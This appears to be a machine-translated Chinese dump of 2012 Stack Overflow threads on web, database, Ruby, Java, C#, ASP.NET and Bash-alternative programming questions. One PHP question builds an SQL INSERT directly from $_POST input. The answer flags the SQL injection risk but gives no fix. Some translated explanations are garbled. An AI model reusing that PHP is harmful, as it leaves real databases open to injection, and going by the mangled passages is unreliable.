我注册了一个没有托管服务器的新域名 (example.com.sg)，但我现有的网站 (example.co.uk) 拥有包含所有脚本、内容和数据库的托管服务器。

如何在 [example.co.uk] 的 htaccess 文件中将我的新域名指向当前网站？

或者当访问者在浏览器中键入 URL 域名 (example.com.sg) 并转到我的网站 (example.so.uk) 时，以任何其他方式重定向该页面？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-04-20T01:51:54.400

我不确定您想要做什么，但如果您没有域的托管服务器，您将无法拥有 .htaccess 文件（因为它需要托管），因此会无法以这种方式重定向。

就像我说的那样，我真的不明白你在问什么。

但是，从一个域到另一个域的重定向看起来像这样：

```
 Redirect 301 / http://example.co.uk/ 
```

这会将所有命中发送到 example.co.uk 的根目录。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-05-06T09:47:35.387

这是`domain parking`做什么。转到您`example.co.uk`网站的 cpanel 并选择`parked domains`. 然后`park example.com.sg`上`example.co.uk`

# mysql - 两列中的不同值

> ID：10239170
> 
> 赞同：1
> 
> 时间：2012-04-20T01:46:06.123
> 
> 标签：mysql

我在mysql中有一个查询

```
select f1,f2,f3 from tableName; 
```

我只想删除字段 f1 和 f2 中的重复值，

我累了如下

```
select f1,f2,f3 from tableName
group by f1,f2; 
```

但它只会删除 f1 中的重复项。任何机构都可以建议我如何删除 f1 和 f2 中的重复项。

```
topic_id    topic_name                    question_type
2237    Understanding Diversity           Comprehensive
2237    Understanding Diversity           Easy
2237    Understanding Diversity           Application
44315   Bhasha, boli, lipi, or Vayakaran  Intermediate 
```

以上是仅在 question_type 列中具有不同值的示例输出，我想从 question_type 和 topic_id 中删除重复项

预期输出：同时具有 topic_id 和 question_type 不同的值

```
 44315  Bhasha, boli, lipi, or Vayakaran  Intermediate
 2237   Understanding Diversity           Comprehensive 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-04-20T02:14:57.107

您快到了 - 您还需要对最后一列进行分组。我只能猜到用法，所以我添加了一个对被覆盖`question_type`的 s 进行排序的摘要，这对于搜索或输出可能很方便：

```
SELECT
  topic_id,
  topic_name,
  GROUP_CONCAT(DISTINCT question_type ORDER BY question_type) AS question_types
FROM tableName
GROUP BY topic_id, topic_name; 
```

输出是：

```
'2237', 'Understanding Diversity', 'Application,Comprehensive,Easy'
'44315', 'Bhasha, boli, lipi, or Vayakaran', 'Itermediate' 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-04-20T02:09:37.657

我的 SQL 确实不是那么好，但我认为您需要执行所谓的嵌套 SELECT 语句。

这是手册参考。

[http://dev.mysql.com/doc/refman/5.0/en/subqueries.html](http://dev.mysql.com/doc/refman/5.0/en/subqueries.html)

这将使 SQL 看起来像这样。

```
SELECT f1,f2,f3 FROM (SELECT f1,f2,f3 FROM tableName AS table1 GROUP BY f1) AS table2 GROUP BY f2; 
```

请注意，我必须使用 AS 来创建别名，否则“tableName”会与父 SQL 选择冲突。

# javascript - 加载页面后，我想用 2 个不同的信息自动填充文本字段

> ID：10239171
> 
> 赞同：0
> 
> 时间：2012-04-20T01:46:14.137
> 
> 标签：javascript, html, javascript-events

请问谁能帮帮我？我想在页面加载后自动将 2 条不同的信息动态填充到单个文本字段中。目前，我有这样的东西，但它不能正常工作：

```
<input type="text" id="success" 
             value="this is the message i want to render once the page 
             loads, this should be rendered with the ID(sucess)."/> 
```

`id="success"`是加载页面后我希望在 textfeild 中获取并显示的第二个信息的 id。目前，一旦加载页面，就会`id="success"`在文本字段中转储我想要的确切信息，但`value="text i want"`不会显示。

我的主要目标是在页面加载后在文本字段中同时显示`id="success"`+ 。`value="text i want"`感谢您的友好帮助。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-04-20T02:27:03.870

这是使用 jQuery。如果您不熟悉它（甚至不熟悉常规 JS），那么您需要查看[他们的网站](http://jquery.com/)……或者一些关于 JS 编程[的好书](http://www.amazon.com/s/ref=nb_sb_ss_c_1_6?url=search-alias=stripbooks&field-keywords=jquery&sprefix=jquery,aps,341)。

```
$(document).ready(function() {
   $('#success').attr("value", "The text you want here");
}​);​ 
```

[这是](http://jsfiddle.net/u9UGQ/)此代码的实际操作。

# ruby - 面向初学者的开源 Ruby 项目

> ID：10239177
> 
> 赞同：-1
> 
> 时间：2012-04-20T01:46:42.287
> 
> 标签：ruby, open-source, github

请原谅我的英语不好。我刚学过C++，没有软件开发经验。有人让我从ruby开始。我发现Github上的这些高级项目太复杂了，我看不懂。所以我正在寻找一些适合像我这样的初学者的小而简单的开源项目。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-04-20T01:56:11.803

考虑完成[Ruby Koans](http://rubykoans.com/)，它通过解决简单问题来教你 Ruby。

也许你提到的一些高级项目之后会看起来更简单。

如果没有，请考虑编写一个简单的[Sinatra](http://www.sinatrarb.com/)应用程序并将其部署到 Heroku。在此过程中，您将了解有关 Ruby 生态系统的更多信息。（例如[Bundler](http://gembundler.com/)和[Rake](http://rake.rubyforge.org/)）

# iphone - uipicker 视图中的整数和 uiimage

> ID：10239180
> 
> 赞同：0
> 
> 时间：2012-04-20T01:46:57.530
> 
> 标签：iphone, objective-c, ios, uikit, uipickerview

我目前有一个带有两个组件的 uipicker。第一个包含图像并且工作正常，但是第二个需要整数值。

这是否可能，因为以下回调方法返回 UIView 类型而不是整数？肯定有办法解决这个问题吗？

-(UIView *)pickerView

任何帮助将不胜感激，非常感谢

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-04-20T02:01:31.423

这？

```
- (UIView *)pickerView:(UIPickerView *)pickerView viewForRow:(NSInteger)row forComponent:(NSInteger)component reusingView:(UIView *)view
{   
    switch (component) {
    case 1:
    {
        UILabel *intvalue = view?(UILabel *)view:[[[UILabel alloc] initWithFrame:CGRectMake(0,0, 50, 40)] autorelease];
        intvalue.text = [NSString stringWithFormat:@"%d",value];
        intvalue.textAlignment = UITextAlignmentCenter;
        intvalue.backgroundColor = [UIColor clearColor];
        return intvalue;
        break;
    }'
} 
```

# python - 如何在 Python 中将输入默认字典切换为小写以进行 NLTK 比较

> ID：10239184
> 
> 赞同：1
> 
> 时间：2012-04-20T01:47:04.690
> 
> 标签：python, nltk

我有一个看起来像的python dict：

```
defaultdict(<type 'int'>, {u'RT': 1, u'be': 1, u'uniforms': 1, u'@ProFootballWkly:': 1, u'in': 1, u'Nike': 1, u'Brooklyn.': 1, u'ET': 1, u"NFL's": 1, u'will': 1, u'a.m.': 1, u'at': 1, u'unveiled': 1, u'Jimmy': 3, u'11': 1, u'new': 1, u'The': 2, u'today': 1}) 
```

我正在处理它：

```
freq_distribution = nltk.FreqDist(filtered_words)               
top_words = freq_distribution.keys()[:4]     
print top_words 
```

这会输出前 4 个单词，其中包括单词“The”我试图在此过程发生之前合并删除 Dolch“常用”单词：

```
filtered_words = [w for w in word_count \
              if not w in stopwords.words('english')] 
```

问题是我仍然以“The”这个词结尾，因为 NLTK 中的所有（停用词）都是小写的。我需要一种方法来输入 word_count 并将其切换为小写。我尝试在各个领域添加 lower()，例如：

```
freq_distribution = nltk.FreqDist(word_count.lower()) 
```

但是没有任何成功，因为我反复收到以下错误：

```
AttributeError: 'list' object has no attribute 'lower' 
```

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-04-20T01:48:48.193

```
filtered_words = [w for w in word_count \
          if w.lower() not in stopwords.words('english')] 
```

在检查它是否在停用词列表中`w` *之前*，它会小写。所以如果`w`是“The”，它将`the`在检查之前转换为。由于“the”在列表中，它将被过滤掉。

# c# - C# 多个组合框

> ID：10239190
> 
> 赞同：0
> 
> 时间：2012-04-20T01:47:49.447
> 
> 标签：c#, combobox

我正在编写一个有两个选项卡的程序。在第一个选项卡上，用户必须输入有关帐户的信息（帐号、姓名、地址和电话号码）。他们还必须输入投资信息（ID、姓名、符号和股票）。每当用户单击添加客户按钮时，该人的姓名就会转到第二个选项卡上的组合框。每当用户输入有关投资的信息时，投资的名称都会进入第一个选项卡上的列表框。我面临的问题是，每当我从第二个选项卡上的组合框中选择一个帐户时，我需要一个投资组合框来仅显示该帐户的条目，而不是在程序启动时输入的每个条目。我需要通过客户组合框中的选择来确定投资组合框中的选择。

这是第一个标签![在此处输入图像描述](../Images/c42e4a8e72b552ffde284346b2b0b38c.png)

这是第二个 ![在此处输入图像描述](../Images/d2c6169ca5b0d97e987f857fb4ef7517.png)

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-04-20T02:22:35.617

将函数连接到`SelectedIndexChanged`ComboBox 的事件。当它运行时，您可以填充另一个 ComboBox。

# iframe - 防止在新窗口或选项卡中打开 iframe

> ID：10239195
> 
> 赞同：0
> 
> 时间：2012-04-20T01:48:24.017
> 
> 标签：iframe, copy-protection

我正在向会员区的 wordpress 博客添加框架内容。有没有办法可以阻止该内容在新窗口或标签中打开？我可以添加一个插件或一串代码？

就像现在一样，如果有人右键单击框架内容，他们可以在新窗口中查看它，并可能共享该 URL，从而使会员网站无法控制谁查看......

我想要一个块...。如果可能的话...当您尝试查看时，我看到其他 iframe 弹出错误消息...。

任何帮助表示赞赏！

感谢您提供信息的好地方

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-04-20T01:59:00.807

我现在能想到的一种可能的解决方案是添加 JavaScript 代码以防止右键单击，但这并不总是有效，因为人们可以简单地禁用 JavaScript，他们仍然可以右键单击查看 iframe 的内容。不仅如此，总有一种方法可以通过使用某种软件甚至使用 FireBug 之类的东西来嗅探 iframe 的 URL。

# ruby - 如何根据用户输入使用别名方法

> ID：10239205
> 
> 赞同：0
> 
> 时间：2012-04-20T01:50:10.670
> 
> 标签：ruby

如何在不使用 eval 的情况下更改以下代码。有没有一种方法可以在初始化堆时根据参数对 getroot 函数起别名。

```
class Heap

  def initialize arr,type=:min
     newfunc = "get#{type.to_s}".to_sym
     eval ("class << self; alias #{newfunc} :getroot; end")
  end

  def getroot     
     puts "Inside Getroot"
  end

end

a = Heap.new([1,2,3],:max)
a.getmax                      #prints Inside Getroot

b = Heap.new([1,2,3],:min)
b.getmin                      #prints Inside Getroot 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-04-20T02:16:44.460

这令人满意吗？

```
class Heap
  def initialize arr, type=:min
    newfunc = "get#{type.to_s}".to_sym
    self.class.class_eval {alias_method newfunc, :getroot}
  end
  def getroot
    puts "Inside Getroot"
  end
end 
```

# java - 具有预定义容量的 HashMap 是否更快

> ID：10239206
> 
> 赞同：9
> 
> 时间：2012-04-20T01:50:17.240
> 
> 标签：java, hashmap

我在网上遇到了一个算法[http://www.coderanch.com/t/201836/Performance/java/Hashtable-vs-Hashmap](http://www.coderanch.com/t/201836/Performance/java/Hashtable-vs-Hashmap) 并决定测试它

```
public class MapTest{
    static int sizeOfTrial = 100000;
    static String[] keys = new String[sizeOfTrial];
    static String[] vals = new String[sizeOfTrial];

    public static void main(String[] args) {
        //init sizeOfTrial key/value pairs
        for (int i=0; i < sizeOfTrial; i++){
          String s1 = "key"+ i;
          String s2 = "val"+ i;
          keys[i] = s1;
          vals[i] = s2;
        }
        test(new TreeMap(), "TreeMap");
        test(new Hashtable(), "Hashtable");
        test(new HashMap(), "HashMap");
        test(new Hashtable(200000), "Hashtable presized");
        test(new HashMap(200000), "HashMap presized");
    }

  public static void test(Map tm, String name){
    long t1 = System.currentTimeMillis();
    for (int i=0; i < sizeOfTrial; i++){
      tm.put(keys[i],vals[i]);
    }
    for (int i=0; i < sizeOfTrial; i++){
      tm.get(keys[i]);
    }
    long t2 = System.currentTimeMillis();
    System.out.println("total time for " + name + ": " + (t2-t1));
  }
} 
```

我得到了以下结果

```
total time for TreeMap: 1744
total time for Hashtable: 446
total time for HashMap: 234
total time for Hashtable presized: 209
total time for HashMap presized: 196 
```

这个 JVM 是独立的和任意的，还是真的提供了更快的访问和存储时间？

* * *

## 回答 #1

> 赞同：10
> 
> 时间：2012-04-20T01:53:09.033

预定义任何容器类型类的预期大小将提供更快的存储时间，这仅仅是因为存储不必经常在运行时动态重新分配。通常后备存储是某种数组，当超出可用容量时，必须将数组复制到一个新的更大的数组中。如果您将大量对象存储到以非常小的容量启动的容器中，这是一项代价高昂的操作，可能必须多次发生。

从地图读取的性能不应该受到任何影响。`tm.put`您可以通过将零件与零件分开计时来更好地证明这一点`tm.get`。

* * *

**编辑**：为了进一步说明这一点，我将代码修改为`tm.put`与`tm.get`. 这是我机器上的结果：

```
total time for TreeMap tm.put: 159
total time for TreeMap tm.get: 74
total time for Hashtable tm.put: 20
total time for Hashtable tm.get: 10
total time for HashMap tm.put: 42
total time for HashMap tm.get: 5
total time for Hashtable presized tm.put: 11
total time for Hashtable presized tm.get: 9
total time for HashMap presized tm.put: 6
total time for HashMap presized tm.get: 4 
```

`Hashtable`请注意， regular 和 presized for之间的差异`tm.put`约为 2。类似地，`HashMap`常规大小和预置大小之间的差异是大约 7 个用于存储的因素。但是，从阅读方面来看，在这两种情况下，两者`Hashtable`的`Hashmap`时间大致相同`tm.get`（`10 ms`vs `9 ms`for`Hashtable`和`5 ms`vs `4 ms`for `HashMap`）。另请注意，在预先确定的情况下，推杆和取球所花费的总时间大致相同。

# c# - 最快的读取二进制文件读写

> ID：10239207
> 
> 赞同：2
> 
> 时间：2012-04-20T01:50:35.327
> 
> 标签：c#, file, parsing

我正在编写一个应用程序来读取和解析大小可能为 1 KB 到 200 MB 的文件。

我必须解析它两次...

1.  提取文件中包含的图像。

2.  解析该图像以提取图像的内容。

我一般使用文件流、缓冲流、二进制读取器和二进制写入器来读写内容。

现在，我想知道读取文件和提取内容的最快和最有效的方法......

有没有好的方法或好的类库？

注意：不安全的代码是可以的！

* * *

## 回答 #1

> 赞同：13
> 
> 时间：2012-04-20T02:57:45.013

读取文件最快和最简单的方法很简单：

```
var file = File.ReadAllBytes(fileName); 
```

这会将整个文件作为字节数组读入内存。然后，您可以通过它以内存阵列访问速度（也就是说，非常快）寻找您需要的东西。这几乎肯定会比在阅读时尝试处理文件要快。

**但是**，如果此文件不能很好地放入内存（并且 81 MB 将），那么您将需要分块执行此操作。如果不需要，我们可以安全地避免这种棘手的讨论。在这种情况下，解决方案将是：

1.  如果使用 .NET 4.0，请使用[内存映射文件](http://msdn.microsoft.com/en-us/library/dd997372.aspx)（更多内容请参见内存映射文件*[的优势是什么？](https://stackoverflow.com/questions/192527/what-are-the-advantages-of-memory-mapped-files)*）。

2.  如果没有，您将需要分块读取、缓存并保留您认为内存中需要的内容（为了提高效率），或者重新读取它，您根本无法将其保存在内存中。这可能会变得混乱和缓慢。

# ruby-on-rails - 新安装的 gem 未在 RVM 中加载

> ID：10239210
> 
> 赞同：1
> 
> 时间：2012-04-20T01:50:41.853
> 
> 标签：ruby-on-rails, gem, rvm

我在获取`Machinist`和`Sham`为我的新 Rails 项目工作时遇到了一些问题。过去我用过`Factory-girl`.

我已经`rvm`安装并通过将它添加到我的 gemfile 来安装机械师。

当我运行 rake 时，出现以下错误...

```
/Users/liamnorton/.rvm/gems/ruby-1.9.2-p290/gems/activesupport-3.2.1/lib/active_support/dependencies.rb:251:in `require': no such file to load -- sham (LoadError) 
```

这是由我的 blueprints.rb 文件顶部的行引起的

```
require 'sham' 
```

有人可以帮我完成这项工作。我过去曾遇到过 RVM 的问题，如果我不需要，我不想崩溃和重建！！

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-04-20T02:33:51.007

好惊喜惊喜，包括`gem 'sham'`我`gemfile`工作的线路！

我认为 Sham 依赖于 Machinist，因此会在运行时安装`bundle install`但没有。机械师 2 将手擦干净。

# r - 在 R 中使用没有命名空间的包

> ID：10239213
> 
> 赞同：7
> 
> 时间：2012-04-20T01:51:35.637
> 
> 标签：r, namespaces, package, packages

我从网站上获得了 betaversion。唯一可用的是将 Windows 安装为 mybetapackage.zip 文件。当我安装包时，加载它时它不起作用。

```
> utils:::menuInstallLocal()
> require(mypackage)
Loading required package: mypackage
Failed with error:  ‘package ‘mypackage’ does not have a NAMESPACE and should be re-installed’ 
```

是否有可能以某种方式使用这个 beta 包？

编辑：

我尝试了以下说明来创建自己的命名空间。命名空间文件包含以下内容：

```
exportPattern("^[^\\.]") 
```

现在我收到以下警告。

```
Warning message:
In readLines(file) :
  incomplete final line found on 'C:/Users/user/Documents/R/win-library/2.14/RCropStat/NAMESPACE 
```

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-04-22T11:32:15.620

基于上面的讨论，我正在回答我自己的问题。所有功劳归于讨论这个问题的人。

使用以下文本创建一个文件并添加一行以避免错误。在具有描述文件的包的目录中相同。

```
exportPattern("^[^\\.]") 
```

# python - 对 Celery 结果使用 amqp 后端和数据库后端有什么区别？

> ID：10239219
> 
> 赞同：1
> 
> 时间：2012-04-20T01:52:28.170
> 
> 标签：python, django, rabbitmq, celery

我不明白在这两种情况下实际结果存储在哪里。
我在测试应用程序中使用**django-celery**和**sqlite**作为我的数据库。我使用**RabbitMQ**作为我的代理。

我尝试设置`CELERY_RESULT_BACKEND = "amqp"`以及“数据库”`CELERY_RESULT_DBURI="mysqlitedb"`

但无论哪种情况，我都不明白一旦存储结果如何与结果进行交互。

我想我无法理解一旦工作人员在任务结束时返回结果会发生什么的基本概念。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-04-20T03:52:00.807

当您向 celery 发送任务时，您会得到`AsyncResult`结果。它有一个`id`属性，您可以将其存储在某处，然后使用[result](http://ask.github.com/celery/reference/celery.result.html)来检查和检索任务执行的实际结果。

结果存储为 AMQP 或数据库表。首先速度更快，不会增加数据库负载，但需要一些额外的设置。

# sql - 转义 sql 中的特殊字符以生成 xml 文件

> ID：10239221
> 
> 赞同：1
> 
> 时间：2012-04-20T01:52:54.180
> 
> 标签：sql, xml, sql-server-2008, escaping

我正在使用 SQL Server 2008，而且我对编写 sql 还是很陌生。我的目标是将表格中的数据导出为 xml 格式，以创建可在我们的网站中使用的 CAP xml 文件。目前，我只是在编写一些选择语句来以正确的格式检索数据。这是代码：

```
select (SELECT TOP 5 [Master_Incident_Number] AS incidents
,[Jurisdiction] AS jurisdiction
,[Response_Date] AS Date
FROM [ESCAD_DW_System].[dbo].[CurrentIncidents_V] Incident 
FOR XML PATH ('area'), type ) AS Alert for xml path (''), 
ROOT ('?xml version = "1.0" encoding = "UTF-8"?') 
```

但是，我收到“无效的 XML 标识符”错误？象征。任何人都可以帮忙吗？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-04-20T02:41:52.667

您不能使用`ROOT`添加 xml 编码标记。做到这一点的唯一方法是将 xml 输出转换为`varchar(max)`编码标记并在前面加上编码标记。请记住，`FOR XML`默认情况下输出是 UTF-16，因此您的 UTF-8 编码可能是不必要的。话虽如此，下面是一个使用 UDF 将 xml 转换为的简单示例`varchar(max)`：

```
create function gimmexml()
returns varchar(max)
as
begin
    return (
        select a='some', b='xml'
        for xml path ('')           
    )
end
go

select '<?xml version="1.0" encoding="UTF-8"?>'+dbo.gimmexml(); 
```

结果：

```
<?xml version="1.0" encoding="UTF-8"?><a>some</a><b>xml</b> 
```

进一步阅读： http: [//www.devnewsgroups.net/group/microsoft.public.sqlserver.xml/topic60022.aspx](http://www.devnewsgroups.net/group/microsoft.public.sqlserver.xml/topic60022.aspx) http://msdn.microsoft.com/en-us/library/ms345137%28v=sql.90% 29.aspx

# php - 使用 AJAX 将数据记录到数据库

> ID：10239226
> 
> 赞同：0
> 
> 时间：2012-04-20T01:53:47.123
> 
> 标签：php, javascript, mysql, html, ajax

我需要使用 AJAX 将用户输入的评论立即保存到数据库中。这是评论框。

```
<div class="comment">
        <form action="comment.php">
        <textarea cols="35" name="comments"> Give us comment </textarea>
        <input type="button" value="comment" onclick="ajaxFunction()">
        </form>                 
 </div> 
```

这是php代码

```
<?php

$link = mysql_connect("localhost","root","");
mysql_select_db("continental_tourism");

$comments = $_POST['comments'];

if($comments == "")
echo "Please type your comment";
else
{
$query = "insert into comment(comment) values('$comments') ";
mysql_query($query);
} 
return;
?> 
```

我需要知道这应该如何改变。谢谢你

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-04-20T02:01:40.563

我会像这样改变你的 HTML

```
<textarea cols="35" id="comments"> Give us comment </textarea>
<input type="button" value="comment" id="btnSave" /> 
```

还有剧本

```
$(function(){
 $("#btnSave").click(function(e){
  e.preventDefault();
  $.post("yourphpfile.php", { comments : $("#comments").val() } ,function(data){
     alert(data);
  });  
 }); 
}); 
```

上面的脚本将向 yourphpfile.php 发送一个 ajax 请求，其值存在于文本区域中，带有 id 注释。然后一旦它从服务器页面获取一些数据。它只是提醒它（如果需要，您可以在单独的 div 中显示它）。将数据保存到数据库后，您应该回显 php 文件中的响应。

如前所述，在保存从查询字符串值读取的数据时，您应该小心 SQL 注入。在将其放入查询之前进行适当的清理。对不起，我不是一个 php 人。所以不知道该怎么做。

**不要忘记将 jQuery 库包含到您的页面**中。

```
<script src="https://ajax.googleapis.com/ajax/libs/jquery/1.6.2/jquery.min.js" type="text/javascript"></script> 
```

如果遇到任何脚本错误，您可以使用 firebug 控制台调试脚本错误。

# c# - 按键验证

> ID：10239227
> 
> 赞同：0
> 
> 时间：2012-04-20T01:53:56.460
> 
> 标签：c#, wpf, xaml

我有以下 WPF 代码来验证按键，并根据按下的键它允许用户输入键或简单地停止按键事件以停止输入无效键..

```
<TextBox PreviewKeyDown="PreviewKeyDown" /> 
```

```
private void PortPreviewKeyDown(object sender, KeyEventArgs e)
{
    bool allowedKeys;
    allowedKeys = // logic for validation

    e.Handled = allowedKeys;
} 
```

我的问题是，这是在 WPF 中进行验证的正确方法吗？我想限制用户输入无效字符。

我知道我可以使用依赖属性并调用验证，然后显示错误或成功消息，但我不想走得太远，我只是想阻止用户输入无效字符。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-20T01:58:17.880

对我来说似乎是一种有效的方法，但是我会尝试在字符无效时显示一些消息告诉用户，否则他们可能会认为某些东西被破坏了。

通过子类化`TextBox`和提供允许字符的属性来使逻辑通用化也是一个好主意。一些库已经有这样的控件，比如[`MaskedTextBox`](http://wpftoolkit.codeplex.com/wikipage?title=MaskedTextBox)扩展的 WPF 工具包，它也提供格式突出显示。

# asp.net - 错误：超出应用程序级别。此错误可能是由于虚拟目录未在 IIS 中配置为应用程序所致

> ID：10239230
> 
> 赞同：1
> 
> 时间：2012-04-20T01:54:26.950
> 
> 标签：asp.net

我从不再与公司合作的开发人员那里继承了这个应用程序。在我获得最新版本并运行该应用程序后，我收到以下错误：

说明：处理服务此请求所需的配置文件期间发生错误。请查看下面的具体错误详细信息并适当地修改您的配置文件。

解析器错误消息：在应用程序级别之外使用注册为 allowDefinition='MachineToApplication' 的部分是错误的。此错误可能是由未在 IIS 中配置为应用程序的虚拟目录引起的。

源错误：

```
Line 170:  <location path="winLogin.aspx">
Line 171:    <system.web>
Line 172:      <authentication mode="Windows" />
Line 173:      <authorization>
Line 174:        <allow users="*" /> 
```

错误提到了 IIS，但是因为这是一个 VS 2005 项目，所以我使用的是默认的 Web 浏览器。

关于如何解决的任何想法？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-20T02:01:48.467

我不相信你可以定义

```
<authentication mode="Windows" /> 
```

在 a 中，`<location>`因为那是应用程序级别的设置。也就是说，你不能在同一个应用程序中对不同的网页使用不同的认证方式。您将需要在`<system.web>`配置文件的主要部分中定义它。

错误消息只是指错误的一种可能来源。在标记内或应用程序根目录的子文件夹中的子文件中使用*任何*应用程序级设置也会生成此错误消息。`<location>``web.config`

如果您确实需要多种身份验证方法，您可以创建一个子文件夹作为虚拟应用程序并在其中定义它，例如，`/winLogin/Default.aspx`由`/winLogin/web.config`.

## 更新

你确定你不能？我刚刚检查了这个应用程序运行良好的 QA 网站，并且 Web.config 有以下条目：

```
<location path="winLogin.aspx">
    <system.web>
      <authentication mode="Windows" /> 
      <authorization>
        <allow users="*" />
      </authorization>
    </system.web>
  </location> 
```

我遇到的问题在我的开发/本地机器上

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-04-20T03:38:00.263

我建议你检查你的应用程序文件夹。

在您的应用程序根文件夹中存在应用程序的备份副本。

或者您在应用程序的某处有一个重复的**Web.config**文件。

您应该做的另一件事是转到**C:\WINDOWS\Microsoft.NET\Framework\v2.0.50727\Temporary ASP.NET Files**并删除与您的应用程序名称相关的所有文件夹。如果它是您的开发框，那么您可以删除此文件夹下的所有内容。

希望这能解决问题。

# bash - 有没有编译成 Bash 的语言？

> ID：10239235
> 
> 赞同：67
> 
> 时间：2012-04-20T01:55:09.160
> 
> 标签：bash, shell, scripting, coffeescript

我既喜欢又讨厌写 Bash。我喜欢它在操作文件和处理进程方面*如此*精简（我同意[这个流行](https://stackoverflow.com/questions/3637668/why-are-scripting-languages-e-g-perl-python-ruby-not-suitable-as-shell-lang)的问题，在这方面它比 Python、Ruby 等要好得多），但我*讨厌*这种语法，尤其是在条件、循环等方面.

（这是主观的，但我觉得它既令人困惑又烦人。例如`$var`，在阅读时，但`var`在写作时；如果 周围有空格，则写入静默失败`=`；使用正则表达式时 ifs 中的双括号；有时使用双分号，其他使用单分号；等等。 )

作为可编译为 JS 的 CoffeeScript 的忠实粉丝，我一直在想：是否有任何语言具有 Python/Ruby/CoffeeScript 等语言的美学/语法，但可以作为 Bash 而不是其他运行时之一编译和运行?

例如，我希望能够用更简单的语法编写大部分 Bash：

```
$AGGREGATE_FILENAME = 'allfiles.txt'

if not exists $AGGREGATE_FILENAME
    touch $AGGREGATE_FILENAME

for $file in files/*
    cat $file >> $AGGREGATE_FILENAME

switch $1
    case 'test'
        run-tests
        echo 'Tests finished!'
    case 'deploy'
        echo 'Packaging...'
        mv foo bar/
        deploy-bar 
```

这是一个超级人为的例子，语法是一个稻草人（主要受 CoffeeScript 启发，但保留了一流命令的基本 Bash 概念，与变量分离，以及松散的类型）。

无论如何，只是一个问题和思考的食物。我希望*能够*用比 Bash 更好的方式编写脚本。=) 谢谢！

* * *

## 回答 #1

> 赞同：20
> 
> 时间：2013-10-29T17:04:34.970

您还可以尝试 Batsh，它是一种 DSL（[域特定语言](https://en.wikipedia.org/wiki/Domain-specific_language)），可将 C 语法语言编译为 Bash（和 Windows Batch）。

*   [项目](https://github.com/BYVoid/Batsh)
*   [在线演示](http://batsh.org)

* * *

## 回答 #2

> 赞同：15
> 
> 时间：2012-10-09T17:39:00.917

自从我最初提出这个问题以来，已经发布了两个项目来解决这个问题并且做得很好。两者都在对编程更友好的运行时中重新实现了许多/大多数 Unix 工具。

Plumbum 是用 Python 实现的，看起来很可靠：

[http://plumbum.readthedocs.org/en/latest/index.html](http://plumbum.readthedocs.org/en/latest/index.html)

ShellJS 是在 Node.js 上实现的，看起来也不错：

[https://github.com/arturadib/shelljs](https://github.com/arturadib/shelljs)

令人兴奋的发展！我期待着尝试一下。如果您已经拥有，很高兴在评论中听到您的经历。谢谢！

* * *

## 回答 #3

> 赞同：9
> 
> 时间：2016-02-21T00:35:05.453

我尝试了上述所有方法（[结果](https://github.com/coderofsalvation/powscript/wiki/Similar-projects)）并启动了**[powscript](https://github.com/coderofsalvation/powscript)**。

差异**powscript**与上述工具

*   极其便携的预处理器（100% bash）
*   coffeescript 和 bash 之间的平衡
*   无忧的便携式多合一文件编译器/运行时，用 bash 编写
*   松散的转译器：内联 bash 总是可能的

* * *

## 回答 #4

> 赞同：7
> 
> 时间：2015-09-11T18:45:56.627

比什是另一种选择：

[https://github.com/tdenniston/bish](https://github.com/tdenniston/bish)

> 具有现代感的 Shell 脚本。
> 
> Bish 是一种轻量级语言，旨在将 shell 脚本带入 21 世纪。它为程序员提供了现代语法的舒适性，但可以编译为 Bash，从而具有良好的可移植性（尽管 Bash 是可移植的）。

* * *

## 回答 #5

> 赞同：5
> 
> 时间：2012-06-06T12:08:45.230

问题是 Bash 的整个基于字符串的语义被严重破坏，很难为 Bash 做类似 CoffeeScript 之类的事情。

由于您可能不需要函数级互操作性来调用用 Bash 编写的函数，因此最好使用完全不同的东西。Perl 与 Bash 很接近，因为它令人讨厌，并且充满了快捷方式和奇怪的语法，但它的语义大多是合理的。Python 对于诸如启动进程之类的事情不太舒服，但对于一般系统编程来说要好得多，干净且易于维护。Python 有很棒的库和模块。Perl 甚至更好。

* * *

## 回答 #6

> 赞同：3
> 
> 时间：2017-11-20T15:25:24.647

我最近开发了一种名为[BashClass](https://amirbawab.github.io/BashClass/)的语言，它是**面向对象**的，具有**类型检查功能**并允许**多维**数组。语言语法受到不同编程语言的启发。

这是一个关于如何实现类的示例（[此处](https://github.com/amirbawab/BashClass/tree/master/example)`List`为完整示例）：

```
class List extends Object {
    var Object[] data = new Object[];
    var int size = 0;
    constructor List(){
        super_constructor();
    }

    function void add(var Object object) {
        data[size] = object;
        size = size + 1;
    }

    function void pop() {
        if(size == 0) {
            exception("Cannot remove element from an empty list");
        }
        size = size - 1;
        data[size] = null;
    }

    function int size() {
        return size;
    }

    function Object get(var int index) {
        if(index < 0 || index >= size) {
            exception("Cannot access element out of bound");
        }
        return data[index];
    }
} 
```

BashClass 中的类和多维数组被转换为 Bash 4.4 关联数组。[该语言是第一个版本，在Github](https://github.com/amirbawab/BashClass)上是开源的。随意贡献和建议功能。

* * *

## 回答 #7

> 赞同：2
> 
> 时间：2012-09-12T12:24:24.030

您可能想尝试一下 ZSh，它有很多改进可以使您的 shell 脚本更具可读性。

[http://www.zsh.org](http://www.zsh.org)

* * *

## 回答 #8

> 赞同：1
> 
> 时间：2015-01-27T19:54:57.380

您可能想看看[nscript](https://github.com/mweststrate/nscript)，您可以在其中使用 javascript 编写 shell 脚本。所有常见的 bash 结构都在其中，例如退出代码、管道、流重定向、参数扩展、通配符、提示符等。

# regex - preg_match / php 样式正则表达式查找重复的字母数字字符，逗号分隔？

> ID：10239236
> 
